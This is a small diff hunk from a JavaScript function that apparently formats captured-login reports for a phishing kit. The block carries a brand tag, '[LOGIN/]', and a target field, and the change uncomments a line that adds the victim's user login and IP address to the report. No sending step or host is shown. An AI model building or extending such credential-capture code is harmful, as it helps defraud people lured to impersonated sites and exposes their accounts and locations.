@@ -173,7 +173,7 @@ function a1(data,ip) {
     let block="";
     block += `${brand}  | [LOGIN/] |  \n`; 
     // block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
-    // block += `USER: ${data.logita}\nIP: ${ip}\n`;
+     block += `USER: ${data.logita}\nIP: ${ip}\n`;
     // block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
     // block += `${brand}  | [${target}]  |  `;
     
